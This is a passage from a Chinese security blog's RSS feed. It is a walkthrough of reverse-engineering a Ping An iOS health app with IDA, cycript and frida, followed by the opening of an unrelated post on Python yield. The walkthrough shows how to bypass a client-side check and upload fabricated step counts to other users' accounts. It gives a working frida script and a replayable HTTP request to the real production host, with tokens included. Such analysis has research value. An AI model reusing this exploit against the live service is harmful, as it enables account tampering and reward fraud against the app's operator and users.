&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;000611FC	__text:-[PARSPedometerInfo setIntegratedSteps:]+C	RET	-[PARSPedometerInfo setIntegratedSteps:] returned to -[PARSPedometerInfo setIntegratedSteps:]-[PARSHealthKitHandler parseStepCountStatistics:]+33C
000611FC	__text:-[PARSHealthKitHandler parseStepCountStatistics:]+340	BL              _objc_release	-[PARSHealthKitHandler parseStepCountStatistics:] call -[PARSHealthKitHandler parseStepCountStatistics:]_objc_release
000611FC	__text:-[PARSHealthKitHandler parseStepCountStatistics:]+348	BL              _objc_release	-[PARSHealthKitHandler parseStepCountStatistics:] call -[PARSHealthKitHandler parseStepCountStatistics:]_objc_release
000611FC	__text:-[PARSHealthKitHandler parseStepCountStatistics:]+358	BL              _objc_msgSend	-[PARSHealthKitHandler parseStepCountStatistics:] call -[PARSHealthKitHandler parseStepCountStatistics:]_objc_msgSend
000611FC	__text:-[PARSHealthKitHandler parseStepCountStatistics:]+360	BL              _objc_retainAutoreleasedReturnValue	-[PARSHealthKitHandler parseStepCountStatistics:] call -[PARSHealthKitHandler parseStepCountStatistics:]_objc_retainAutoreleasedReturnValue
000611FC	__text:-[PARSHealthKitHandler parseStepCountStatistics:]+378	BL              _objc_msgSend	-[PARSHealthKitHandler parseStepCountStatistics:] call -[PARSHealthKitHandler parseStepCountStatistics:]_objc_msgSend
000611FC	__text:-[PARSHealthKitHandler parseStepCountStatistics:]+380	BL              _objc_release	-[PARSHealthKitHandler parseStepCountStatistics:] call -[PARSHealthKitHandler parseStepCountStatistics:]_objc_release
000611FC	__text:-[PARSHealthKitHandler parseStepCountStatistics:]+388	BL              _objc_release	-[PARSHealthKitHandler parseStepCountStatistics:] call -[PARSHealthKitHandler parseStepCountStatistics:]_objc_release
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;尝试用&lt;a href=&quot;https://github.com/deresz/funcap&quot;&gt;funcap&lt;/a&gt;插件获得&lt;code class=&quot;highlighter-rouge&quot;&gt;parseStepCountStatistics&lt;/code&gt;函数的参数及返回值,发现funcap不支持arm的64位的cpu,ios设备cpu类型在&lt;a href=&quot;http://blakespot.com/ios_device_specifications_grid.html&quot;&gt;这里&lt;/a&gt;于是用theos来记录,发现theos没有成功记录到parseStepCountStatistics函数的运行函数及返回值,说明关键函数不是这个函数,也即ida没有成功记录到关键的上传步数的函数,目前不理解为什么ida的trace功能为什么没有记录到这个关键函数.现在只好通过flex_injected来通过UI来分析出关键函数&lt;/p&gt;

&lt;p&gt;flex_injected查看关键上传按钮对应的UI类,如下图依次找到对应按钮的类(PARSHealthPedometer10thHomeViewController)与点击按钮对应的函数(walkUploadBtnClick)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/ida_usb_flex1.jpg&quot; alt=&quot;上传按钮&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/ida_usb_flex2.png&quot; alt=&quot;按钮对应类&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/ida_usb_flex3.png&quot; alt=&quot;按钮对应函数&quot; /&gt;&lt;/p&gt;

&lt;p&gt;从ida中查看walkUploadBtnClick函数的具体实现,内容如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;void __cdecl -[PARSHealthPedmoterHomeViewController walkUploadBtnClick:](PARSHealthPedmoterHomeViewController *self, SEL a2, id a3)
{
  PARSHealthPedmoterHomeViewController *v3; // x28
  PARSActivityDetailModel *v4; // x0
  void *v5; // x0
  void *v6; // x19
  void *v7; // x0
  __int64 v8; // x20
  void *v9; // x0
  __int64 v10; // x21
  void *v11; // x0
  __int64 v12; // x25
  struct objc_object *v13; // x0
  void *v14; // x0
  void *v15; // x19
  void *v16; // x0
  void *v17; // x0
  void *v18; // x26
  void *v19; // x0
  __int64 v20; // x21
  struct objc_object *v21; // x0
  void *v22; // x26
  PARSActivityDetailModel *v23; // x0
  void *v24; // x0
  void *v25; // x27
  void *v26; // x0
  __int64 v27; // x0
  __int64 v28; // x23
  void *v29; // x0
  __int64 v30; // x0
  __int64 v31; // x19
  void *v32; // x0
  void *v33; // x22
  struct objc_object *v34; // x0
  void *v35; // x0
  void *v36; // x19
  void *v37; // x0
  void *v38; // x23
  void *v39; // x0
  void *v40; // x24
  void *v41; // x0
  void *v42; // x25
  struct objc_object *v43; // x0
  void *v44; // x19
  int v45; // w28
  int v46; // w27
  unsigned int v47; // w0
  PARSHealthPedmoterHomeViewController *v48; // [xsp+18h] [xbp-58h]

  v3 = self;
  +[PARSDataAnalyticTrackTouch cacheCurrentPoint](&amp;amp;OBJC_CLASS___PARSDataAnalyticTrackTouch, &quot;cacheCurrentPoint&quot;, a3);
  v4 = -[PARSHealthPedmoterHomeViewController activity](v3, &quot;activity&quot;);
  v5 = (void *)objc_retainAutoreleasedReturnValue(v4);
  v6 = v5;
  v7 = objc_msgSend(v5, &quot;activityId&quot;);
  v8 = objc_retainAutoreleasedReturnValue(v7);
  objc_release(v6);
  v9 = objc_msgSend(&amp;amp;OBJC_CLASS___NSString, &quot;stringWithFormat:&quot;, CFSTR(&quot;49902-%@&quot;), v8);
  v10 = objc_retainAutoreleasedReturnValue(v9);
  v11 = objc_msgSend(&amp;amp;OBJC_CLASS___NSString, &quot;stringWithFormat:&quot;, CFSTR(&quot;4990201-%@&quot;), v8);
  v12 = objc_retainAutoreleasedReturnValue(v11);
  +[PADataAnalytic trackEvent:label:](&amp;amp;OBJC_CLASS___PADataAnalytic, &quot;trackEvent:label:&quot;, v10, v12);
  objc_release(v12);
  objc_release(v10);
  v13 = +[PARSUserManager sharedManager](&amp;amp;OBJC_CLASS___PARSUserManager, &quot;sharedManager&quot;);
  v14 = (void *)objc_retainAutoreleasedReturnValue(v13);
  v15 = v14;
  v16 = objc_msgSend(v14, &quot;currUserInfo&quot;);
  v17 = (void *)objc_retainAutoreleasedReturnValue(v16);
  v18 = v17;
  v19 = objc_msgSend(v17, &quot;userId&quot;);
  v20 = objc_retainAutoreleasedReturnValue(v19);
  objc_release(v18);
  objc_release(v15);
  v21 = +[PARSUserDefaults sharedDefaultsOfUser:](&amp;amp;OBJC_CLASS___PARSUserDefaults, &quot;sharedDefaultsOfUser:&quot;, v20);
  v22 = (void *)objc_retainAutoreleasedReturnValue(v21);
  v48 = v3;
  v23 = -[PARSHealthPedmoterHomeViewController activity](v3, &quot;activity&quot;);
  v24 = (void *)objc_retainAutoreleasedReturnValue(v23);
  v25 = v24;
  v26 = objc_msgSend(v24, &quot;activityId&quot;);
  v27 = objc_retainAutoreleasedReturnValue(v26);
  v28 = v27;
  v29 = objc_msgSend(&amp;amp;OBJC_CLASS___NSString, &quot;stringWithFormat:&quot;, CFSTR(&quot;%@%@%@&quot;), CFSTR(&quot;selectValue&quot;), v20, v27);
  v30 = objc_retainAutoreleasedReturnValue(v29);
  v31 = v30;
  v32 = objc_msgSend(v22, &quot;objectForKey:&quot;, v30);
  v33 = (void *)objc_retainAutoreleasedReturnValue(v32);
  objc_release(v31);
  objc_release(v28);
  objc_release(v25);
  objc_release(v22);
  v34 = +[PARSHealthCircleWalkingManager sharedManager](&amp;amp;OBJC_CLASS___PARSHealthCircleWalkingManager, &quot;sharedManager&quot;);
  v35 = (void *)objc_retainAutoreleasedReturnValue(v34);
  v36 = v35;
  v37 = objc_msgSend(v35, &quot;resultDict&quot;);
  v38 = (void *)objc_retainAutoreleasedReturnValue(v37);
  objc_release(v36);
  v39 = objc_msgSend(v38, &quot;objectForKeyedSubscript:&quot;, CFSTR(&quot;raiseFlag&quot;));
  v40 = (void *)objc_retainAutoreleasedReturnValue(v39);
  v41 = objc_msgSend(v38, &quot;objectForKeyedSubscript:&quot;, CFSTR(&quot;baseDonateStep&quot;));
  v42 = (void *)objc_retainAutoreleasedReturnValue(v41);
  v43 = +[PARSConfDefaults shareDefaults](&amp;amp;OBJC_CLASS___PARSConfDefaults, &quot;shareDefaults&quot;);
  v44 = (void *)objc_retainAutoreleasedReturnValue(v43);
  v45 = (unsigned __int64)objc_msgSend(v44, &quot;showDonateBook&quot;);
  objc_release(v44);
  v46 = (unsigned __int64)objc_msgSend(v40, &quot;isEqualToString:&quot;, CFSTR(&quot;Y&quot;));
  if ( !(unsigned int)objc_msgSend(v38, &quot;isNotEmpty&quot;)
    || (v46 | (objc_msgSend(v42, &quot;length&quot;) == 0LL)) &amp;amp; 1
    || (v45 ^ 1) &amp;amp; 1
    || objc_msgSend(v33, &quot;length&quot;) )
  {
    v47 = (unsigned __int64)objc_msgSend(v33, &quot;isEqualToString:&quot;, CFSTR(&quot;1&quot;));
    -[PARSHealthPedmoterHomeViewController requestUploadWithSure:](v48, &quot;requestUploadWithSure:&quot;, v46 | v47);
  }
  else
  {
    -[PARSHealthPedmoterHomeViewController showFirstDonatabookAlert](v48, &quot;showFirstDonatabookAlert&quot;);
  }
  objc_release(v42);
  objc_release(v40);
  objc_release(v38);
  objc_release(v33);
  objc_release(v20);
  objc_release(v8);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;发现关键函数是&lt;code class=&quot;highlighter-rouge&quot;&gt;-[PARSHealthPedmoterHomeViewController requestUploadWithSure:](v48, &quot;requestUploadWithSure:&quot;, v46 | v47);&lt;/code&gt;这里的&lt;code class=&quot;highlighter-rouge&quot;&gt;requestUploadWithSure&lt;/code&gt;函数,在ida中查看如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;void __cdecl -[PARSHealthPedometer10thHomeViewController requestUploadWithSure:](PARSHealthPedometer10thHomeViewController *self, SEL a2, bool a3)
{
  bool v3; // w19
  PARSHealthPedometer10thHomeViewController *v4; // x20
  PARSHWPedometerUploadView *v5; // x0
  void *v6; // x0
  void *v7; // x21
  void *v8; // x0
  void *v9; // x24
  char v10; // w25
  PARSActivityDetailModel *v11; // x0
  void *v12; // x0
  void *v13; // x24
  void *v14; // x0
  __int64 v15; // ST08_8
  struct objc_object *v16; // x0
  void *v17; // x0
  void *v18; // x24
  void *v19; // x0
  void *v20; // x0
  void *v21; // x27
  void *v22; // x0
  __int64 v23; // x0
  __int64 v24; // x21
  struct objc_object *v25; // x0
  void *v26; // x28
  PARSActivityDetailModel *v27; // x0
  void *v28; // x0
  void *v29; // x25
  void *v30; // x0
  __int64 v31; // x26
  PARSHWPedometerUploadView *v32; // x0
  void *v33; // x0
  void *v34; // x23
  void *v35; // x0
  void *v36; // x24
  struct objc_object *v37; // x0
  __int64 v38; // x1
  void *v39; // x24
  __int64 v40; // x1
  __int64 v41; // x1
  __int64 v42; // x20
  void **v43; // [xsp+10h] [xbp-D0h]
  __int64 v44; // [xsp+18h] [xbp-C8h]
  __int64 (__fastcall *v45)(); // [xsp+20h] [xbp-C0h]
  void *v46; // [xsp+28h] [xbp-B8h]
  __int64 v47; // [xsp+30h] [xbp-B0h]
  __int64 v48; // [xsp+38h] [xbp-A8h]
  __int64 v49; // [xsp+40h] [xbp-A0h]
  bool v50; // [xsp+48h] [xbp-98h]
  void **v51; // [xsp+50h] [xbp-90h]
  __int64 v52; // [xsp+58h] [xbp-88h]
  __int64 (__fastcall *v53)(); // [xsp+60h] [xbp-80h]
  void *v54; // [xsp+68h] [xbp-78h]
  __int64 v55; // [xsp+70h] [xbp-70h]
  char v56; // [xsp+78h] [xbp-68h]

  v3 = a3;
  v4 = self;
  v5 = -[PARSHealthPedometer10thHomeViewController uploadView](self, &quot;uploadView&quot;);
  v6 = (void *)objc_retainAutoreleasedReturnValue(v5);
  v7 = v6;
  v8 = objc_msgSend(v6, &quot;walkUploadBtn&quot;);
  v9 = (void *)objc_retainAutoreleasedReturnValue(v8);
  v10 = (unsigned __int64)objc_msgSend(v9, &quot;isCircleLoadingAnimating&quot;);
  objc_release(v9);
  objc_release(v7);
  if ( !(v10 &amp;amp; 1) )
  {
    v11 = -[PARSHealthPedometer10thHomeViewController activity](v4, &quot;activity&quot;);
    v12 = (void *)objc_retainAutoreleasedReturnValue(v11);
    v13 = v12;
    v14 = objc_msgSend(v12, &quot;activityId&quot;);
    v15 = objc_retainAutoreleasedReturnValue(v14);
    objc_release(v13);
    v16 = +[PARSUserManager sharedManager](&amp;amp;OBJC_CLASS___PARSUserManager, &quot;sharedManager&quot;);
    v17 = (void *)objc_retainAutoreleasedReturnValue(v16);
    v18 = v17;
    v19 = objc_msgSend(v17, &quot;currUserInfo&quot;);
    v20 = (void *)objc_retainAutoreleasedReturnValue(v19);
    v21 = v20;
    v22 = objc_msgSend(v20, &quot;userId&quot;);
    v23 = objc_retainAutoreleasedReturnValue(v22);
    v24 = v23;
    v25 = +[PARSUserDefaults sharedDefaultsOfUser:](&amp;amp;OBJC_CLASS___PARSUserDefaults, &quot;sharedDefaultsOfUser:&quot;, v23);
    v26 = (void *)objc_retainAutoreleasedReturnValue(v25);
    v27 = -[PARSHealthPedometer10thHomeViewController activity](v4, &quot;activity&quot;);
    v28 = (void *)objc_retainAutoreleasedReturnValue(v27);
    v29 = v28;
    v30 = objc_msgSend(v28, &quot;activityId&quot;);
    v31 = objc_retainAutoreleasedReturnValue(v30);
    objc_msgSend(v26, &quot;setObject:forKey:&quot;, v31, CFSTR(&quot;localActivityId&quot;));
    objc_release(v31);
    objc_release(v29);
    objc_release(v26);
    objc_release(v24);
    objc_release(v21);
    objc_release(v18);
    objc_initWeak(&amp;amp;v56, v4);
    v32 = -[PARSHealthPedometer10thHomeViewController uploadView](v4, &quot;uploadView&quot;);
    v33 = (void *)objc_retainAutoreleasedReturnValue(v32);
    v34 = v33;
    v35 = objc_msgSend(v33, &quot;walkUploadBtn&quot;);
    v36 = (void *)objc_retainAutoreleasedReturnValue(v35);
    v51 = _NSConcreteStackBlock;
    v52 = 3254779904LL;
    v53 = sub_100BC9B58;
    v54 = &amp;amp;unk_10311DDE8;
    objc_copyWeak(&amp;amp;v55, &amp;amp;v56);
    objc_msgSend(v36, &quot;startCircleLoadingAnimateWithClockwise:completion:&quot;, 0LL, &amp;amp;v51);
    objc_release(v36);
    objc_release(v34);
    v37 = +[PARSPedometerService sharedService](&amp;amp;OBJC_CLASS___PARSPedometerService, &quot;sharedService&quot;);
    v39 = (void *)objc_retain(v37, v38);
    v43 = _NSConcreteStackBlock;
    v44 = 3254779904LL;
    v45 = sub_100BC9EDC;
    v46 = &amp;amp;unk_10311DF08;
    v47 = objc_retain(v4, v40);
    objc_copyWeak(&amp;amp;v49, &amp;amp;v56);
    v42 = objc_retain(v15, v41);
    v48 = v42;
    v50 = v3;
    objc_msgSend(v39, &quot;healthWalkUploadTodayPedometer:&quot;, &amp;amp;v43);
    objc_release(v39);
    objc_release(v48);
    objc_destroyWeak(&amp;amp;v49);
    objc_release(v47);
    objc_destroyWeak(&amp;amp;v55);
    objc_destroyWeak(&amp;amp;v56);
    objc_release(v42);
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;从这里看出这个函数的参数是传入0或1,也可发现这个函数的进一步调用的函数是&lt;code class=&quot;highlighter-rouge&quot;&gt;healthWalkUploadTodayPedometer&lt;/code&gt;,但由于&lt;code class=&quot;highlighter-rouge&quot;&gt;healthWalkUploadTodayPedometer&lt;/code&gt;函数的参数是一个内存地址,需要动态设置,而requestUploadWithSure函数的参数传入”1”即可,用requestUploadWithSure函数更方法用&lt;a href=&quot;http://www.cycript.org/&quot;&gt;cycript&lt;/a&gt;测试,于是直接在cycript中测试requestUploadWithSure(1),验证是否是关键函数,操作如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh root@iphone_ip
cycript -p PALxxx
choose(PARSEPedometerInfo)
    cy# choose(PARSPedometerInfo)
    [#&quot;PARSPedometerInfo&amp;lt;0x12f22cd60&amp;gt;: \n integration=1541 \n iPhone=1541 \n watch=0 \n heartRat=0\n at:2017-12-26 16:00:00 +0000&quot;,#&quot;PARSPedometerInfo&amp;lt;0x12f406c90&amp;gt;: \n integration=1541 \n iPhone=1541 \n watch=0 \n heartRat=0\n at:2017-12-26 16:00:00 +0000&quot;]
    也即找到两个PARSPedometerInfo类的对象,随便用其中一个即可
[#0x12f22cd60 setIntegratedSteps:66666]
    这里设置上传步数为66666,但是还没有上传

    **注意:这里的setIntegratedSteps函数是-号开头的函数,如果是+号开头的函数则用法为[className funcName:66666],如下面的函数是+号开头的(加号的意思就是其他函数可以直接调用这个类中的这个函数,而不用创建这个类的实例),用法如下:
    cy# [PARSCryptDataUtils encryptWithServerTimestamp:&quot;18013790233&quot;]
        结果为:
        @&quot;VF8ITErCt6L7HE0aG8/dBKFIokGahl57ulg6zGfpsMFHahc88SlPqW+ZHp5H9dKht3LSDsxR0asc/gy5phkqUMWCGhYNXsxDz1MVDxGfPW0B5tnOMiFEV5XnuKAw2SkpqafI5d86zrgDKR4JeD8FUtK6Cmv1eB3DvofPOJVj7js=&quot;

tmp=[PARSHealthPedometer10thHomeViewController alloc]
    生成关键上传函数requestUploadWithSure所在类的一个对象
[tmp requestUploadWithSure:1]
    执行上传步数函数,参数为1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;执行完上面的函数后在app中成功弹窗,提示上传成功,说明这个函数是关键上传函数,尝试用这个函数给其他用户上传步数,操作如下&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app用其他用户的帐号登录
ssh root@iphone_ip
cycript -p PALxxx
choose(PARSEPedometerInfo)
    cy# choose(PARSPedometerInfo)
    [#&quot;PARSPedometerInfo&amp;lt;0x14893bad0&amp;gt;: \n integration=1541 \n iPhone=1541 \n watch=0 \n heartRat=0\n at:2017-12-26 16:00:00 +0000&quot;]
[#0x14893bad0 setIntegratedSteps:66666]
    这里设置上传步数为66666,但是还没有上传
tmp1=[PARSHealthPedometer10thHomeViewController alloc]
    生成关键上传函数requestUploadWithSure所在类的一个对象
[tmp1 requestUploadWithSure:1]
    执行上传步数函数,参数为1
    或者将上传的动作合成1步[[PARSHealthPedometer10thHomeViewController alloc] setIntegratedSteps:66666]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;上面是使用cycript给其他用户上传步数,也可通过frida如下实现(执行代码前需要用其他用户的帐号登陆本机app)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import frida
import sys

session = frida.get_usb_device().attach(1535)
script_string = &quot;&quot;&quot;

if (ObjC.available)
{
    try
    {
        var my_obj1=ObjC.chooseSync(ObjC.classes.PARSPedometerInfo)[0]
        var my_obj2=ObjC.classes.PARSHealthPedometer10thHomeViewController.alloc()
        my_obj1[&quot;- setIntegratedSteps:&quot;](66666)
        my_obj2[&quot;- requestUploadWithSure:&quot;](1)
    }
    catch(err)
    {
        console.log(&quot;[!] Exception2: &quot; + err.message);
    }
}
else
{
    console.log(&quot;Objective-C Runtime is not available!&quot;);
}
&quot;&quot;&quot;


script = session.create_script(script_string)


def on_message(message, data):
    if message['type'] == 'error':
        print(&quot;[!] &quot; + message['stack'])
    elif message['type'] == 'send':
        print(&quot;[i] &quot; + message['payload'])
    else:
        print(message)


script.on('message', on_message)
script.load()
sys.stdin.read()
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;通过函数给其他用户上传步数时也上传成功了,而在app中给其他用户上传时会弹出无法给其他用户上传的对话框,说明这个对话框对应的校验只是客户端校验,直接调用上传函数可绕过.另外,也可通过直接发burpsuite拦截到的上传包来实现给其他用户上传步数,需要修改burpsuite上传包中的securitytoken和mobilephone参数,其中cookie可随便填写或不填(说明上传步数时未校验登录态),一个可用包如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /elis_smp_eco_dmz/ecology/elis.eco.web.healthPedomeSTQ.visit HTTP/1.1
Host: elis-smp-eco.pingan.com.cn
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Cookie: 111
Connection: close
Accept: */*
User-Agent: PALxxx/4.9.0 (iPhone; iOS 8.1.1; Scale/2.00)
Accept-Language: zh-Hans;q=1
Content-Length: 1663
X-Tingyun-Id: s8-utloiNb8;c=2;r=2140640508

appId=10001&amp;amp;appVersion=4.8.9&amp;amp;bundleIdentifier=com.pingan.pars&amp;amp;chS=PKXwVPYlgXk06HHPubC3akmiPpMgR6KsaQ%2Bt4M2jJjUc/s2OgG7aQTgPykBKi0EvAjCdb0t20uoASkeT97M21wbV56lWmnIvlrExdB2Jhfe7OXMJ0M77Whx0fAO8%2BOKi9NNTftTzTVijKT/kObVQUfqH1GQCob7KtrUN8nJxn/8%3D&amp;amp;channelType=01&amp;amp;cv=490&amp;amp;deviceId=h902704274530537c4335a514f5821f5a&amp;amp;deviceToken=98b769eac2c74c882f68f0754a73c0a7698e4f8ba9222e5c20454de3f220c517&amp;amp;jsonFlag=Y&amp;amp;mobilePhone=ybN4u%2BkrjDmVoc/Bbu4YF0su9H9yMUsd0fcp9TKX/hDH2UfvQNuYeqtF4pGxlYi5z/S3dHl1zrzlYTTXjdgAaesXvk1v0A4Eh0Y/yyngiIAAq/jC4s1zIxOrchddIIr7p3XJ1pzFyxtKZBvdvtiNHZMZStM86lg8oytIOyIWUn0%3D&amp;amp;osType=01&amp;amp;osVersion=8.1.1&amp;amp;pedometerList=%5B%0A%20%20%7B%0A%20%20%20%20%22iWatch%22%20%3A%20%220%22%2C%0A%20%20%20%20%22iPhone%22%20%3A%20%220%22%2C%0A%20%20%20%20%22pedometerNum%22%20%3A%20%2218785%22%2C%0A%20%20%20%20%22BMP%22%20%3A%20%220%22%2C%0A%20%20%20%20%22pedometerDate%22%20%3A%20%222017-12-27%22%0A%20%20%7D%2C%0A%20%20%7B%0A%20%20%20%20%22iWatch%22%20%3A%20%220%22%2C%0A%20%20%20%20%22iPhone%22%20%3A%20%220%22%2C%0A%20%20%20%20%22pedometerNum%22%20%3A%20%2218785%22%2C%0A%20%20%20%20%22BMP%22%20%3A%20%220%22%2C%0A%20%20%20%20%22pedometerDate%22%20%3A%20%222017-11-06%22%0A%20%20%7D%0A%5D&amp;amp;raiseFlag=Y&amp;amp;securityToken=bfeUcy8KJ7WHcldHioMh0K%2Bg7JX%2BpRN%2BxhMrSvphjgqtwJwzeo2NunKswzCs4%2B9uPcLwR27WVlfVQ9b%2BWOd6/qeGtyWgUPVGUrNPq9QJY85kE8Y%2Ba6xbJsQSPrY0IiLDAkQe4bylB5DfvTmBLaaF/Q%3D%3D&amp;amp;timeset=YXCZD7hNQ9JLA363HFt5Ip5v%2BhbUlBNqvJCz496nlYe8rt2Ykad9AKQPr1aP6YnXdIYxidOamBlTUqLBShKL9JZowpkmd6Rd1PQAFoDhrEAR8feIPSy/laVJOJ/HaOEZtCvzG2nkssSW3YervLbSd81pKiKWcxLA4wsLHPp%2Bm7g%3D&amp;amp;token=2a2d999d889bdb302dd0c6087afe269b797f4fabf298404009545f8f19723fd4&amp;amp;uid=836832654629371904
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x3-后记&quot;&gt;0x3 后记&lt;/h3&gt;

&lt;p&gt;刚开始的操作尝试给其他用户上传步数时遇到一些问题,发现app没有生成PARSPedometerInfo对象(后来发现只要点击进入到上传步数页面后就会生成PARSPedometerInfo对象),详情及对应解决方法如下&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;成功时的PARSPedometerInfo对象:
    cy# choose(PARSPedometerInfo)
    [#&quot;PARSPedometerInfo&amp;lt;0x12f22cd60&amp;gt;: \n integration=1541 \n iPhone=1541 \n watch=0 \n heartRat=0\n at:2017-12-26 16:00:00 +0000&quot;,#&quot;PARSPedometerInfo&amp;lt;0x12f406c90&amp;gt;: \n integration=1541 \n iPhone=1541 \n watch=0 \n heartRat=0\n at:2017-12-26 16:00:00 +0000&quot;]

失败时的PARSPedometerInfo对象:
    由于app没有生成PARSPedometerInfo对象,需要手动生成
    tmp=[PARSPedometerInfo alloc]
        #&quot;PARSPedometerInfo&amp;lt;0x14893bad0&amp;gt;: \n integration=0 \n iPhone=0 \n watch=0 \n heartRat=0\n at:(null)&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;发现失败时手动生成的PARSPedometerInfo类的对象的”时间值”为(null),有可能就是这个部分为null导致上传失败,尝试通过手动设置一个时间到手动生成的PARSPedometerInfo类的对象中,在ida中查看有没有设置时间的函数,发现PARSPedometerInfo包括如下函数:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-[PARSPedometerInfo init]	__text	000000010069C7AC	00000080	00000030	FFFFFFFFFFFFFFF8	R	.	.	.	B	T	.
-[PARSPedometerInfo description]	__text	000000010069C82C	000000CC	00000070	FFFFFFFFFFFFFFF8	R	.	.	.	B	T	.
-[PARSPedometerInfo iPhoneSteps]	__text	000000010069C8F8	00000010			R	.	.	.	.	T	.
-[PARSPedometerInfo setIPhoneSteps:]	__text	000000010069C908	00000010			R	.	.	.	.	T	.
-[PARSPedometerInfo iWatchSteps]	__text	000000010069C918	00000010			R	.	.	.	.	T	.
-[PARSPedometerInfo setIWatchSteps:]	__text	000000010069C928	00000010			R	.	.	.	.	T	.
-[PARSPedometerInfo otherDeviceSteps]	__text	000000010069C938	00000010			R	.	.	.	.	T	.
-[PARSPedometerInfo setOtherDeviceSteps:]	__text	000000010069C948	00000010			R	.	.	.	.	T	.
-[PARSPedometerInfo integratedSteps]	__text	000000010069C958	00000010			R	.	.	.	.	T	.
-[PARSPedometerInfo setIntegratedSteps:]	__text	000000010069C968	00000010			R	.	.	.	.	T	.
-[PARSPedometerInfo heartRate]	__text	000000010069C978	00000010			R	.	.	.	.	T	.
-[PARSPedometerInfo setHeartRate:]	__text	000000010069C988	00000010			R	.	.	.	.	T	.
-[PARSPedometerInfo startDate]	__text	000000010069C998	00000010			R	.	.	.	.	T	.
-[PARSPedometerInfo setStartDate:]	__text	000000010069C9A8	00000014			R	.	.	.	.	T	.
-[PARSPedometerInfo endDate]	__text	000000010069C9BC	00000010			R	.	.	.	.	T	.
-[PARSPedometerInfo setEndDate:]	__text	000000010069C9CC	00000014			R	.	.	.	.	T	.
-[PARSPedometerInfo syncDate]	__text	000000010069C9E0	00000010			R	.	.	.	.	T	.
-[PARSPedometerInfo setSyncDate:]	__text	000000010069C9F0	00000014			R	.	.	.	.	T	.
-[PARSPedometerInfo stepFrequency]	__text	000000010069CA04	00000010			R	.	.	.	.	T	.
-[PARSPedometerInfo setStepFrequency:]	__text	000000010069CA14	00000010			R	.	.	.	.	T	.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;猜测setStartDate函数是设置时间的函数,而startDate函数是获取setStartDate函数设置时间后的时间的函数,于是操作如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;用第1个成功上传步数的帐户登录app
ssh root@iphone_ip
cycript -p PALxxx
choose(PARSPedometerInfo)
   [#&quot;PARSPedometerInfo&amp;lt;0x146fe33e0&amp;gt;: \n integration=2937 \n iPhone=2937 \n watch=0 \n heartRat=0\n at:2017-12-26 16:00:00 +0000&quot;]
cy# [#0x146fe33e0 startDate]
    #&quot;2017-12-26 16:00:00 +0000&quot;
    得到一个正确格式的时间值
退出app
用第2个上传步数失败的帐户登录app
cycript -p PALxxx
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;然后再尝试上传其他帐户的步数,操作如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;到这里发现用第2个帐户上传时其实是会生成PARSPedometerInfo对象的,于是没有再进行后续操作,通过burpsuite发包内容可以推测,上传步数时的时间值的确不能少,接下来的操作理应会成功
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Mon, 25 Dec 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/12/25/ida%E9%80%9A%E8%BF%87usb%E8%B0%83%E8%AF%95ios%E4%B8%8B%E7%9A%84app/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/12/25/ida%E9%80%9A%E8%BF%87usb%E8%B0%83%E8%AF%95ios%E4%B8%8B%E7%9A%84app/</guid>
        
        <category>ida</category>
        
        <category>ipa</category>
        
        <category>usbmuxd</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>快速理解yield</title>
        <description>&lt;h3 id=&quot;0x0-必读link&quot;&gt;0x0 必读link&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.deeplearn.me/231.html&quot;&gt;Python-yield理解篇&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://foofish.net/understanding-yield.html&quot;&gt;如何理解Python关键字yield&lt;/a&gt;&lt;/li&gt;
